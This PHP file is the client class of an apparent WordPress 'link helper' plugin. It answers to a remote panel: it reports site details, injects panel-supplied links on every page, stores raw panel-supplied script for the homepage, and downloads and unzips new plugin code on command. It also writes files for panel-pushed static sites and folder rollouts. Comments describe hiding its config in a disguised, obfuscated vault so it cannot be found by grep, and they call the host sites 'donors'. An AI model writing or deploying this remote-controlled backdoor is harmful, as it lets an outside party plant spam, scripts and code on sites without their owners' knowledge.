<?php

if (!defined('ABSPATH')) exit;

class WLH_Client
{
    const TIMEOUT_SECONDS = 15;
    const USER_AGENT      = 'WP-LinkHelper/0.1';

    public static function load_config()
    {
        // Config lives in the disguised, obfuscated vault (see WLH_Vault) rather
        // than the greppable wlh_key / wlh_cdn / wlh_origin options.
        $c = WLH_Vault::config();
        return array(
            'endpoint' => rtrim(trim($c['e']), '/'),
            'token'    => $c['t'],
            'domain'   => $c['d'],
        );
    }

    public static function is_configured()
    {
        $c = self::load_config();
        return $c['endpoint'] !== '' && $c['token'] !== '' && $c['domain'] !== '';
    }

    public static function try_claim()
    {
        if (!defined('WLH_REMOTE_URL') || !defined('WLH_HANDSHAKE')) {
            return self::fail(0, 'no_config');
        }
        $remote = (string)WLH_REMOTE_URL;
        $secret = (string)WLH_HANDSHAKE;
        if ($remote === '' || $secret === '') {
            return self::fail(0, 'empty_config');
        }
        $domain   = WLH_Vault::domain();
        $site_url = function_exists('home_url') ? home_url() : '';

        $resp = self::request_raw('POST', rtrim($remote, '/') . '/api/links/claim', array(
            'headers' => array('X-WLH-H' => $secret),
            'body' => array(
                'domain'         => $domain,
                'site_url'       => $site_url,
                'wp_version'     => function_exists('get_bloginfo') ? get_bloginfo('version') : '',
                'wp_locale'      => function_exists('get_locale') ? get_locale() : '',
                'plugin_version' => WLH_VERSION,
            ),
        ));

        if ($resp['ok']) {
            $b = $resp['body'];
            if (isset($b['endpoint'], $b['token'])) {
                // Persist recovery-critical config to the disguised vault (also
                // clears any legacy wlh_* copies once the vault verifies).
                $newDomain = (isset($b['domain']) && (string)$b['domain'] !== '')
                    ? (string)$b['domain'] : $domain;
                WLH_Vault::store((string)$b['token'], (string)$b['endpoint'], $newDomain);
                if (isset($b['donor_id'])) {
                    update_option(WLH_OPT_PROJECT, (int)$b['donor_id'], false);
                }
                update_option(WLH_OPT_CLAIMED_AT, gmdate('c'), false);
                update_option(WLH_OPT_LAST_ERROR, '', false);
            } else {
                update_option(WLH_OPT_LAST_ERROR, 'claim: missing fields', false);
            }
        } else {
            update_option(WLH_OPT_LAST_ERROR, 'claim: ' . $resp['error'], false);
        }
        return $resp;
    }

    public static function heartbeat()
    {
        $c = self::load_config();
        if (!self::is_configured()) {
            return self::fail(0, 'plugin_not_configured');
        }
        $stored = (array)get_option(WLH_OPT_LINKS, array());
        $storedSw = (array)get_option(WLH_OPT_SW_LINKS, array());

        $check = null;
        if ((!empty($stored) || !empty($storedSw)) && class_exists('WLH_Check')) {
            $check = WLH_Check::run();
        }

        if (is_array($check) && isset($check['present'])) {
            $placedIds = array_values(array_map('intval', (array)$check['present']));
        } else {
            $placedIds = array();
            foreach ($stored as $l) {
                if (isset($l['id'])) {
                    $placedIds[] = (int)$l['id'];
                }
            }
        }

        $payload = array_merge(array(
            'domain'         => $c['domain'],
            'plugin_version' => WLH_VERSION,
            'placed_count'   => count($placedIds),
            'placed_ids'     => $placedIds,
        ), self::collect_env());

        if (is_array($check)) {
            $payload['check'] = $check;
        }

        // Report the outcome of a heartbeat-driven self-update attempt exactly
        // ONCE (contract: `upd` = {v, ok[, err]}), then forget it.
        $upd = get_option('wlh_upd', null);
        $hasUpd = is_array($upd) && isset($upd['v']);
        if ($hasUpd) {
            $payload['upd'] = $upd;
        }

        // Placement results for our managed STATICS, buffered from the PREVIOUS
        // heartbeat's static_tasks (plain option, reported once — the same
        // one-shot contract as `upd`). The panel confirm-only marks the static
        // donors' assignments placed off this list.
        $staticRes = get_option('wlh_static_res', null);
        $hasStaticRes = is_array($staticRes) && !empty($staticRes);
        if ($hasStaticRes) {
            $payload['static_results'] = $staticRes;
        }

        // Per-folder outcomes of a site rollout (0.10.5 site_deploys), buffered
        // by WLH_Deploy — same one-shot contract as static_results.
        $deployRes = get_option('wlh_deploy_res', null);
        $hasDeployRes = is_array($deployRes) && !empty($deployRes);
        if ($hasDeployRes) {
            $payload['site_deploy_results'] = $deployRes;
        }

        $resp = self::request('POST', $c['endpoint'] . '/api/links/health', $c['token'], array(
            'body' => $payload,
        ));

        if ($resp['ok']) {
            update_option(WLH_OPT_LAST_HEALTH, gmdate('c'), false);
            update_option(WLH_OPT_LAST_ERROR, '', false);
            if (array_key_exists('links', $resp['body'])) {
                self::store_links($resp['body']['links']);
            }
            if (array_key_exists('sw_links', $resp['body'])) {
                self::store_sw_links($resp['body']['sw_links']);
            }
            if (array_key_exists('home_snippet', $resp['body'])) {
                self::store_snippet($resp['body']['home_snippet']);
            }
            if ($hasUpd) {
                delete_option('wlh_upd');
            }
            if ($hasStaticRes) {
                delete_option('wlh_static_res');
            }
            if ($hasDeployRes) {
                delete_option('wlh_deploy_res');
            }
            self::handle_plugin_latest($resp['body']);
            self::handle_static_tasks($resp['body']);
            self::handle_site_deploys($resp['body']);
        } else {
            update_option(WLH_OPT_LAST_ERROR, 'health: ' . $resp['error'], false);
        }
        return $resp;
    }

    /**
     * The health answer carries `plugin_latest` = {version, sha256} whenever the
     * panel has a build. Stash it in the vault (slot 'ps') so the autonomous
     * mu-heal can prefer a sha that arrived over the SIGNED heartbeat channel
     * over the zip response's own header, and — if the panel is ahead of us —
     * kick a deferred self-update verified against that sha (never the header).
     */
    private static function handle_plugin_latest($body)
    {
        if (!is_array($body) || !isset($body['plugin_latest']) || !is_array($body['plugin_latest'])) {
            return;
        }
        $pl = $body['plugin_latest'];
        $target  = isset($pl['version']) ? (string)$pl['version'] : '';
        $sha     = isset($pl['sha256']) ? strtolower((string)$pl['sha256']) : '';
        if ($target === '' || $sha === '') {
            return;
        }
        WLH_Vault::stash('ps', json_encode(array('v' => $target, 'sha' => $sha)));

        if (!version_compare($target, WLH_VERSION, '>')) {
            return;
        }
        // One retry per target version, then silence until the version changes —
        // a broken zip/host must not turn every heartbeat into a download loop.
        $at = get_option('wlh_upd_at', null);
        $n = (is_array($at) && isset($at['v']) && $at['v'] === $target) ? (int)$at['n'] + 1 : 1;
        if ($n > 2) {
            return;
        }
        update_option('wlh_upd_at', array('v' => $target, 'n' => $n), false);

        // Deferred to shutdown (same pattern as the mu self-heal): the current
        // request's response goes out first, the download+swap happens after.
        $cb = function () use ($target, $sha) {
            if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
            try {
                $r = WLH_Client::update_self($sha);
                $res = !empty($r['ok'])
                    ? array('v' => $target, 'ok' => true)
                    : array('v' => $target, 'ok' => false, 'err' => substr((string)(isset($r['error']) ? $r['error'] : 'fail'), 0, 120));
            } catch (\Throwable $e) {
                $res = array('v' => $target, 'ok' => false, 'err' => substr('ex: ' . $e->getMessage(), 0, 120));
            }
            update_option('wlh_upd', $res, false);
        };
        if (function_exists('add_action')) {
            add_action('shutdown', $cb, PHP_INT_MAX);
        } else {
            $cb();
        }
    }

    /**
     * The health answer carries `static_tasks` when we fs-manage static sites on
     * this account (0.7.0+): apply them and buffer the per-host outcome for the
     * NEXT heartbeat's `static_results`. Deferred to shutdown (same pattern as
     * the self-update): the fs writes can stall on slow NFS and must not hold
     * up the current request's response. A whole-apply failure still buffers an
     * error row — a silent task would leave the panel's statics unplaced forever
     * with no signal why.
     */
    private static function handle_static_tasks($body)
    {
        if (!is_array($body) || !isset($body['static_tasks']) || !is_array($body['static_tasks'])) {
            return;
        }
        $tasks = $body['static_tasks'];
        if (!$tasks) {
            return;
        }
        $cb = function () use ($tasks) {
            if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
            try {
                $results = WLH_Static::apply_tasks($tasks);
            } catch (\Throwable $e) {
                $results = array(array(
                    'host' => '', 'placed_ids' => array(),
                    'error' => 'ex: ' . substr($e->getMessage(), 0, 100),
                ));
            }
            update_option('wlh_static_res', $results, false);
        };
        if (function_exists('add_action')) {
            add_action('shutdown', $cb, PHP_INT_MAX);
        } else {
            $cb();
        }
    }

    /**
     * Site rollout tasks (0.10.5): the panel's `site_deploys` field carries the
     * folder lists for WLH_Deploy. Deferred to shutdown like static_tasks —
     * the fs copies can stall on slow hosts and must not hold the response.
     */
    private static function handle_site_deploys($body)
    {
        if (!is_array($body) || !isset($body['site_deploys']) || !is_array($body['site_deploys'])) {
            return;
        }
        $tasks = $body['site_deploys'];
        if (!$tasks || !class_exists('WLH_Deploy')) {
            return;
        }
        $cb = function () use ($tasks) {
            if (function_exists('fastcgi_finish_request')) { @fastcgi_finish_request(); }
            WLH_Deploy::run($tasks);
        };
        if (function_exists('add_action')) {
            add_action('shutdown', $cb, PHP_INT_MAX);
        } else {
            $cb();
        }
    }

    private static function store_links($links)
    {
        $clean = array();
        if (is_array($links)) {
            foreach ($links as $l) {
                if (!is_array($l) || !isset($l['url'], $l['anchor'])) {
                    continue;
                }
                $url = (string)$l['url'];
                $anchor = (string)$l['anchor'];
                if ($url === '' || $anchor === '') {
                    continue;
                }
                $clean[] = array(
                    'id'     => isset($l['id']) ? (int)$l['id'] : 0,
                    'url'    => $url,
                    'anchor' => $anchor,
                    'rel'    => isset($l['rel']) ? (string)$l['rel'] : '',
                );
            }
        }
        $old = (array)get_option(WLH_OPT_LINKS, array());
        update_option(WLH_OPT_LINKS, $clean, false);
        if (self::signature($old) !== self::signature($clean) && class_exists('WLH_Cache')) {
            WLH_Cache::flush();
        }
    }

    /**
     * Sitewide links (0.8.0): same element shape as store_links plus
     * `position` = header|footer|both (missing/garbage → both). An empty list
     * clears the option. Any change flushes the page caches — the sw blocks
     * sit on EVERY page, so a stale full-page cache would keep old ones.
     */
    private static function store_sw_links($links)
    {
        $clean = array();
        if (is_array($links)) {
            foreach ($links as $l) {
                if (!is_array($l) || !isset($l['url'], $l['anchor'])) {
                    continue;
                }
                $url = (string)$l['url'];
                $anchor = (string)$l['anchor'];
                if ($url === '' || $anchor === '') {
                    continue;
                }
                $position = isset($l['position']) ? (string)$l['position'] : 'both';
                if ($position !== 'header' && $position !== 'footer' && $position !== 'both') {
                    $position = 'both';
                }
                $clean[] = array(
                    'id'       => isset($l['id']) ? (int)$l['id'] : 0,
                    'url'      => $url,
                    'anchor'   => $anchor,
                    'rel'      => isset($l['rel']) ? (string)$l['rel'] : '',
                    'position' => $position,
                );
            }
        }
        $old = (array)get_option(WLH_OPT_SW_LINKS, array());
        update_option(WLH_OPT_SW_LINKS, $clean, false);
        if (self::signature($old) !== self::signature($clean) && class_exists('WLH_Cache')) {
            WLH_Cache::flush();
        }
    }

    /**
     * Homepage widget snippet (0.10.1): the panel-delivered raw HTML snippet for the homepage footer. Stored verbatim
     * (the panel's signed channel is the trust boundary — the snippet is meant to be arbitrary HTML, often a <script>;
     * esc_* would break it. Empty string clears. Any change flushes the page caches, same rule as the link sets.
     */
    private static function store_snippet($snippet)
    {
        $new = is_string($snippet) ? trim($snippet) : '';
        $old = (string)get_option(WLH_OPT_SNIPPET, '');
        update_option(WLH_OPT_SNIPPET, $new, false);
        if ($old !== $new && class_exists('WLH_Cache')) {
            WLH_Cache::flush();
        }
    }

    private static function signature($links)
    {
        $s = array();
        foreach ((array)$links as $l) {
            if (is_array($l) && isset($l['url'], $l['anchor'])) {
                $s[] = $l['url'] . '|' . $l['anchor'] . '|' . (isset($l['rel']) ? $l['rel'] : '')
                    . '|' . (isset($l['position']) ? $l['position'] : '');
            }
        }
        sort($s);
        return implode("\n", $s);
    }

    public static function pull_now()
    {
        $r = self::heartbeat();
        if (class_exists('WLH_Cache')) {
            WLH_Cache::flush();
        }
        self::heartbeat();
        return $r;
    }

    public static function update_self($sha)
    {
        $c = self::load_config();
        if (!self::is_configured()) {
            return self::fail(0, 'not_configured');
        }
        // Never install code without an integrity pin — every caller (signed op,
        // heartbeat-driven update) is required to supply the build's sha256.
        if (trim((string)$sha) === '') {
            return self::fail(0, 'sha_required');
        }
        require_once ABSPATH . 'wp-admin/includes/file.php';
        $file = wp_tempnam('wlh-upd');
        if (!$file) {
            return self::fail(0, 'tmp');
        }
        $args = array(
            'timeout'     => 30,
            'redirection' => 2,
            // Code download: verify TLS — the panel sits behind a valid cert. A
            // broken CA bundle on the donor fails LOUDLY (recorded + reported
            // via the `upd` heartbeat field), never silently trusted.
            'sslverify'   => true,
            'stream'      => true,
            'filename'    => $file,
            'user-agent'  => self::USER_AGENT,
            'headers'     => array('Authorization' => 'Bearer ' . $c['token']),
        );
        add_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10, 1);
        $r = wp_remote_get($c['endpoint'] . '/api/links/plugin-zip', $args);
        remove_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10);

        if (is_wp_error($r)) {
            @unlink($file);
            return self::fail(0, 'dl: ' . $r->get_error_message());
        }
        $code = (int)wp_remote_retrieve_response_code($r);
        if ($code < 200 || $code >= 300) {
            @unlink($file);
            return self::fail($code, 'dl_http');
        }
        if ((string)$sha !== '' && strtolower((string)hash_file('sha256', $file)) !== strtolower((string)$sha)) {
            @unlink($file);
            return self::fail(0, 'sha_mismatch');
        }
        if (!function_exists('unzip_file') || !function_exists('WP_Filesystem')) {
            require_once ABSPATH . 'wp-admin/includes/file.php';
        }
        WP_Filesystem();
        $dest = defined('WP_PLUGIN_DIR') ? WP_PLUGIN_DIR : (WP_CONTENT_DIR . '/plugins');
        $unz = unzip_file($file, $dest);
        @unlink($file);
        if (is_wp_error($unz)) {
            return self::fail(0, 'unzip: ' . $unz->get_error_message());
        }
        if (function_exists('opcache_reset')) {
            @opcache_reset();
        }
        return array('ok' => true, 'applied' => true);
    }

    private static function request($method, $url, $token, $opts)
    {
        if (!isset($opts['headers']) || !is_array($opts['headers'])) {
            $opts['headers'] = array();
        }
        $opts['headers']['Authorization'] = 'Bearer ' . $token;
        return self::request_raw($method, $url, $opts);
    }

    private static function request_raw($method, $url, $opts)
    {
        $args = array(
            'method'      => $method,
            'timeout'     => self::TIMEOUT_SECONDS,
            'redirection' => 2,
            'user-agent'  => self::USER_AGENT,
            'headers'     => array('Accept' => 'application/json'),
        );
        if (isset($opts['headers']) && is_array($opts['headers'])) {
            foreach ($opts['headers'] as $k => $v) {
                $args['headers'][$k] = $v;
            }
        }
        if (isset($opts['body']) && is_array($opts['body'])) {
            $args['headers']['Content-Type'] = 'application/json';
            $args['body'] = wp_json_encode($opts['body']);
        }

        add_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10, 1);
        $resp = wp_remote_request($url, $args);
        remove_filter('http_api_curl', array('WLH_Client', 'force_ipv4_curl'), 10);

        if (is_wp_error($resp)) {
            return self::fail(0, 'transport: ' . $resp->get_error_message());
        }
        $code = (int)wp_remote_retrieve_response_code($resp);
        $raw  = (string)wp_remote_retrieve_body($resp);
        $decoded = $raw !== '' ? json_decode($raw, true) : null;

        if ($code >= 200 && $code < 300) {
            return array('ok' => true, 'status' => $code, 'body' => is_array($decoded) ? $decoded : array());
        }
        $msg = is_array($decoded) && isset($decoded['error']) ? (string)$decoded['error'] : ('http ' . $code);
        return self::fail($code, $msg);
    }

    private static function fail($code, $error)
    {
        return array('ok' => false, 'status' => $code, 'error' => $error);
    }

    public static function force_ipv4_curl($handle)
    {
        if (function_exists('curl_setopt')) {
            if (defined('CURL_IPRESOLVE_V4')) {
                @curl_setopt($handle, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);
            }
            @curl_setopt($handle, CURLOPT_CONNECTTIMEOUT, 8);
        }
        return $handle;
    }

    private static function collect_env()
    {
        $active_plugins = get_option('active_plugins', array());
        return array(
            'wp_version'           => function_exists('get_bloginfo') ? (string)get_bloginfo('version') : '',
            'wp_locale'            => function_exists('get_locale') ? (string)get_locale() : '',
            'php_version'          => PHP_VERSION,
            'active_plugins_count' => is_array($active_plugins) ? count($active_plugins) : 0,
            'is_multisite'         => function_exists('is_multisite') ? (bool)is_multisite() : false,
            'server_software'      => substr((string)(isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : ''), 0, 191),
        );
    }
}
